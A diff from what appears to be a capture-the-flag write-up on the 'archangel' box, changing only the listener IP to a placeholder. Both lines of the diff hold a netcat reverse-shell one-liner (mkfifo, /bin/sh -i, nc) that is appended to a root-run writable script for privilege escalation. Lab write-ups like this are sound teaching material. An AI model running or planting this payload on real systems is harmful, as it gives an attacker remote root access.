@@ -135,7 +135,7 @@ If we `ls -la` the file we can see we have write permission on it.
 
 
 We will echo this one liner into the file and wait for the execution by root:
-`echo "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.21.97.226 4445 >/tmp/f" >> helloworld.sh`
+`echo "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc xx.xx.xx.xx 4445 >/tmp/f" >> helloworld.sh`
 (Activate netcat in another terminal on port 4445)
 And obviously, we will stabilize the shell again and search for the flag of the user archangel.
 ![](https://github.com/user-attachments/assets/f8ad5060-bc0f-4ff5-9262-a05c0ac7ebfa)
